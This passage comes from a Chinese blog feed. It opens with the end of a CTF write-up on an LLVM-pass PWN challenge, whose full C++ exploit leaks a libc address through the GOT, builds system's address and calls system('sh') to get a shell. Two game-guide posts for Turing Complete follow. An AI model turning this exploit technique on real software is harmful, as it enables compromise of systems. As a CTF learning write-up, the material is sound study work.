class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// op1</span></span><br><span class="line"><span class="comment">// idx&lt;=5</span></span><br><span class="line"><span class="comment">// regs[idx]=num1+num2</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4addiEhii(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num1, <span class="type">int</span> num2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op2</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; -0x1000&lt;num&lt;0x1000 &amp;&amp; isUsed[0]==0</span></span><br><span class="line"><span class="comment">// use_once</span></span><br><span class="line"><span class="comment">// regs[idx]+=num</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4chgrEhi(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op3</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; offset&lt;0x40</span></span><br><span class="line"><span class="comment">// choice==0: regs[idx]&gt;&gt;=offset</span></span><br><span class="line"><span class="comment">// choice==1: regs[idx]&lt;&lt;=offset</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4sftrEhbh(edoc *op, <span class="type">int8_t</span> idx, <span class="type">bool</span> choice, <span class="type">int8_t</span> offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op4</span></span><br><span class="line"><span class="comment">// idx1&lt;=5 &amp;&amp; idx2&lt;=5 &amp;&amp; idx3&lt;=5</span></span><br><span class="line"><span class="comment">// regs[idx1] = regs[idx3] | regs[idx2]</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4borrEhhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2, <span class="type">int8_t</span> idx3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op5</span></span><br><span class="line"><span class="comment">// idx1&lt;8 &amp;&amp; idx2&lt;8</span></span><br><span class="line"><span class="comment">// regs[idx1] = regs[idx2]</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4movrEhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op6</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">//*(regs[6]+num) = regs[idx]  //?</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4saveEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op7</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">// regs[idx] = *(regs[6]+num)</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4loadEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op8</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">//*(regs[6]+num)(regs[idx])   //break</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4runcEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>num&amp;7&#x3D;&#x3D;0意味着低三位为0。regs[6]&amp;0xfff=&#x3D;0意味着低1.5个字节要为0。op8这个函数指针太显眼了。接下来该思考如果getshell了。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>如果不出意外，最后肯定要利用op8构造一个<code>system(&quot;/bin/sh&quot;)</code>。那么我们就需要想办法使*(regs[6])存system的真实地址（或者附近），但是这个regs[6]不是我们能够直接操控的。唯一能看到一点希望的是op5，因为他可以通过交换数据间接控制regs[6]和regs[7]。</p><p>opt的got表可读可写，我们考虑从got入手泄露出libc地址。显然op7可以很容易做到这一点，然后再考虑利用运算得到system地址。先用IDA打开opt看一眼got表，我们需要找到一个已经解析过地址的函数，0x442068处的<code>__cxa_atexit</code>函数就很显眼。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// op1 regs[0]=memcpy@got</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442050</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调试一下看是否成功写进去，然后发现竟然没进到vmRun，打开exp.ll文件一看，llvm帮我把函数名给改了……那就使用extern “C”避开c++的优化，这下可以了。其他声明也是同理。（吐槽，c++的函数名太长了动调看得是真的难受啊）</p><p>动调发现这个regs数组实际是在堆上的。并且regs[6]和regs[7]一开始就不为0，里面存了类似mmap出来的一块地址的始末地址，神奇的是他位于ld模块中间。估计是在init的时候写入的。<img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-mmap%E5%A7%8B%E6%9C%AB%E5%9C%B0%E5%9D%80.png" alt="yl-mmap始末地址"><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-mmap%E5%A7%8B%E6%9C%AB%E5%9C%B0%E5%9D%80%E5%87%BA%E5%A4%84.png" alt="yl-mmap始末地址出处"></p><p>下面我们考虑上约束条件，尝试将<code>__cxa_atexit</code>的libc地址泄露出来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[6]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68+0x1000</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x443000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[7]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op7 regs[0] = *(regs[6]+0x68)</span></span><br><span class="line">    _ZN4edoc4loadEhj(op, <span class="number">0</span>, <span class="number">0x68</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-%E5%86%99%E5%85%A5cxa_atexit%E5%9C%B0%E5%9D%80.png" alt="yl-写入cxa_atexit地址"></p><p>可以看到成功了。接着考虑构造system地址。system在libc中的偏移是0x50D70，__cxa_atexit是0x458C0。利用位移和加法构造system，最后将system地址放到mmap的地址上执行即可。所以一开始我们还需要把mmap的地址保存下来。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// op1</span></span><br><span class="line">    <span class="comment">// idx&lt;=5</span></span><br><span class="line">    <span class="comment">// regs[idx]=num1+num2</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4addiEhii(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num1, <span class="type">int</span> num2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op2</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; -0x1000&lt;num&lt;0x1000 &amp;&amp; isUsed[0]==0</span></span><br><span class="line">    <span class="comment">// use_once</span></span><br><span class="line">    <span class="comment">// regs[idx]+=num</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4chgrEhi(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op3</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; offset&lt;0x40</span></span><br><span class="line">    <span class="comment">// choice==0: regs[idx]&gt;&gt;=offset</span></span><br><span class="line">    <span class="comment">// choice==1: regs[idx]&lt;&lt;=offset</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4sftrEhbh(edoc *op, <span class="type">int8_t</span> idx, <span class="type">bool</span> choice, <span class="type">int8_t</span> offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op4</span></span><br><span class="line">    <span class="comment">// idx1&lt;=5 &amp;&amp; idx2&lt;=5 &amp;&amp; idx3&lt;=5</span></span><br><span class="line">    <span class="comment">// regs[idx1] = regs[idx3] | regs[idx2]</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4borrEhhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2, <span class="type">int8_t</span> idx3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op5</span></span><br><span class="line">    <span class="comment">// idx1&lt;8 &amp;&amp; idx2&lt;8</span></span><br><span class="line">    <span class="comment">// regs[idx1] = regs[idx2]</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4movrEhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op6</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">//*(regs[6]+num) = regs[idx]  //?</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4saveEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op7</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">// regs[idx] = *(regs[6]+num)</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4loadEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op8</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">//*(regs[6]+num)(regs[idx])   //break</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4runcEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// 保存mmap地址</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[6]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68+0x1000</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x443000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[7]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op7 regs[0] = *(regs[6]+0x68) 泄露libc</span></span><br><span class="line">    _ZN4edoc4loadEhj(op, <span class="number">0</span>, <span class="number">0x68</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op5 regs[1]=regs[0] 备份高位</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&lt;&lt;=44  清空高位，只留0x458C0</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">1</span>, <span class="number">44</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&gt;&gt;=44  清空高位，只留0x458C0</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">44</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&gt;&gt;=12  将0x458C0中的0x45移动到低位</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="comment">// op2 regs[0]+=0xd  将0x458C0中的0x45变成0x50D70中的0x50</span></span><br><span class="line">    _ZN4edoc4chgrEhi(op, <span class="number">0</span>, <span class="number">0xd</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&lt;&lt;=12  恢复原位</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="comment">// op1 regs[3]=0xd70</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">3</span>, <span class="number">0xd70</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[3] | regs[0] 合并地址</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op3 regs[1]&gt;&gt;=20  清空低位，只留libc基址的高位部分</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="comment">// op3 regs[1]&lt;&lt;=20  清空低位，只留libc基址的高位部分</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">1</span>, <span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[0] | regs[1] 合并地址</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还原mmap地址</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">4</span>);</span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// op6 *(regs[6]+0) = regs[0]  &amp;system</span></span><br><span class="line">    _ZN4edoc4saveEhj(op, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op1 regs[3]=26739   &quot;sh&quot;</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">3</span>, <span class="number">26739</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=8</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[0] | regs[4]  regs[6]+8</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// op6 *(regs[6]+8) = &quot;sh&quot;</span></span><br><span class="line">    _ZN4edoc4saveEhj(op, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op8 诸神黄昏</span></span><br><span class="line">    _ZN4edoc4runcEhj(op, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-getshell.png" alt="yl-getshell"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我好困，睡了。再见，花了我三个钟的恶心人的题目。</p>]]></content>
    
    
    <summary type="html">llvm pass pwn 入门</summary>
    
    
    
    <category term="llvm pass" scheme="https://c-lby.top/categories/llvm-pass/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="llvm" scheme="https://c-lby.top/tags/llvm/"/>
    
    <category term="编译原理" scheme="https://c-lby.top/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>『图灵完备』完全攻略之处理器架构（四）</title>
    <link href="https://c-lby.top/2024/Turing-Complete-4/"/>
    <id>https://c-lby.top/2024/Turing-Complete-4/</id>
    <published>2024-10-25T07:40:24.000Z</published>
    <updated>2024-10-24T08:26:45.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OVERTURE架构"><a href="#OVERTURE架构" class="headerlink" title="OVERTURE架构"></a>OVERTURE架构</h2><p><img src="https://c-lby.top/images/Turing-Complete/4/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87.png" alt="图灵完备"></p><h3 id="指令解码器"><a href="#指令解码器" class="headerlink" title="指令解码器"></a>指令解码器</h3><p>位于架构上方</p><p><img src="https://c-lby.top/images/Turing-Complete/4/DEC.png" alt="DEC"></p><h3 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h3><p>架构左下角</p><p><img src="https://c-lby.top/images/Turing-Complete/4/COND.png" alt="COND"></p><h3 id="算数引擎"><a href="#算数引擎" class="headerlink" title="算数引擎"></a>算数引擎</h3><p>ALU，位于架构右上角</p><p><img src="https://c-lby.top/images/Turing-Complete/4/ALU.png" alt="ALU"></p>]]></content>
    
    
    <summary type="html">我发现上面的关卡写完之后，前面的也会同步，所以直接展示图灵完备那一关，并且展示各个元件好了。至此，你完成了一台可运行的计算机。</summary>
    
    
    
    <category term="图灵完备" scheme="https://c-lby.top/categories/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    
    <category term="图灵完备" scheme="https://c-lby.top/tags/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    <category term="计组" scheme="https://c-lby.top/tags/%E8%AE%A1%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>『图灵完备』完全攻略之存储器（三）</title>
    <link href="https://c-lby.top/2024/Turing-Complete-3/"/>
    <id>https://c-lby.top/2024/Turing-Complete-3/</id>
    <published>2024-10-24T07:40:24.000Z</published>
    <updated>2024-10-25T03:55:18.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="循环依赖"><a href="#循环依赖" class="headerlink" title="循环依赖"></a>循环依赖</h2><p>要你搭建一个输出决定输入的错误电路。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96.png" alt="循环依赖"></p><h2 id="延迟线"><a href="#延迟线" class="headerlink" title="延迟线"></a>延迟线</h2><p>延迟线元件的体验关卡，根据预期输出可以看到输入延迟了两刻才输出。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%BB%B6%E8%BF%9F%E7%BA%BF.png" alt="延迟线"></p><h2 id="奇变偶不变"><a href="#奇变偶不变" class="headerlink" title="奇变偶不变"></a>奇变偶不变</h2><p>关卡告诉我们在延迟的情况下，输出是可以决定输入的。本关卡需要在偶数刻输出高电平，我们利用异或和延迟输出可以做到这一点。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%A5%87%E5%8F%98%E5%81%B6%E4%B8%8D%E5%8F%98.png" alt="奇变偶不变"></p><p>手册解锁了“循环依赖白名单”词条，讲了三种锁存器的实现是不受循环依赖的限制的。</p><h2 id="1位取反器"><a href="#1位取反器" class="headerlink" title="1位取反器"></a>1位取反器</h2><p>根据反转位决定是否需要对输入进行取反后输出。观察真值表可以发现性质和异或门完全一样。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/1%E4%BD%8D%E5%8F%96%E5%8F%8D%E5%99%A8.png" alt="1位取反器"></p><h2 id="1位开关"><a href="#1位开关" class="headerlink" title="1位开关"></a>1位开关</h2><p>用2个开关和2个非门搭建一个异或门。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/1%E4%BD%8D%E5%BC%80%E5%85%B3.png" alt="1位开关"></p><h2 id="数据选择器"><a href="#数据选择器" class="headerlink" title="数据选择器"></a>数据选择器</h2><p>根据选通输入选择一个输入端发送给输出，利用开关和非门就能完成这个电路</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E6%95%B0%E6%8D%AE%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="数据选择器"></p><h2 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h2><p>我们可以先布置好每个输入到每个输出的线路，然后再通过布置开关来控制某条线路是否允许通过即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E6%80%BB%E7%BA%BF1.png" alt="总线1"></p><p>但是显然这样子不够优雅，并且也没有体现标题总线。我们知道在一次发送中一定只有一个输入一个输出，因此我们只需要一条线进行数据传输，其他端口都接入这条总线即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E6%80%BB%E7%BA%BF2.png" alt="总线2"></p><h2 id="优雅存储"><a href="#优雅存储" class="headerlink" title="优雅存储"></a>优雅存储</h2><p>这关其实不难想。延迟线的作用是延迟一刻输出，并且延迟后的输出可以给到输入，那么储存一个数，我们是否可以理解为一直输出这个数，延迟无数刻。那么我只要把延迟后的输出再传入到延迟之前的电路，那我就可以一直输出同一个数字了。那我们要更新数字的时候怎么办呢？只要切断延迟输出回到输入这条路，切换成待写入的值给延迟线即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E4%BC%98%E9%9B%85%E5%AD%98%E5%82%A8.png" alt="优雅存储"></p><h2 id="存储一字节"><a href="#存储一字节" class="headerlink" title="存储一字节"></a>存储一字节</h2><p>利用1位存储器搭建8位存储器</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%AD%98%E5%82%A8%E4%B8%80%E5%AD%97%E8%8A%82.png" alt="存储一字节"></p><h2 id="小盒子"><a href="#小盒子" class="headerlink" title="小盒子"></a>小盒子</h2><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%B0%8F%E7%9B%92%E5%AD%90.png" alt="小盒子"></p><h2 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h2><p><img src="https://c-lby.top/images/Turing-Complete/3/%E8%AE%A1%E6%95%B0%E5%99%A8.png" alt="计数器"></p>]]></content>
    
    
    <summary type="html">本攻略没有那么追求极致的效率和布局，大佬轻喷。</summary>
    
    
    
    <category term="图灵完备" scheme="https://c-lby.top/categories/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    
    <category term="图灵完备" scheme="https://c-lby.top/tags/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    <category term="计组" scheme="https://c-lby.top/tags/%E8%AE%A1%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>『图灵完备』完全攻略之算数运算（二）</title>
    <link href="https://c-lby.top/2024/Turing-Complete-2/"/>
    <id>https://c-lby.top/2024/Turing-Complete-2/</id>
    <published>2024-10-23T12:40:24.000Z</published>
    <updated>2024-10-25T03:55:28.484Z</updated>
    
